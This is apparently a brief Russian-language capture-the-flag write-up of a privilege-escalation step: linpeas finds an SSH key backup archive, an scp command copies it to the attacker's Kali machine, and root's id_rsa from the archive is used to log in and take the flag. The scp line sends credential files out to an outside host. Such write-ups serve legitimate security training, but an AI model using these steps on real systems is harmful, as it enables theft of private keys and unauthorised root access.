С помощью linpeas находим файл /mnt/backup/sshkey_backup.zip
запускаем ssh у себя на машине и передаем файл scp /mnt/backup/sshkey_backup.zip  kali@100.100.2.252:/tmp
Затем распакуем его и найдем id_rsa для root пользователя
Подключаемся по ssh с помощью id_rsa и забираем флаг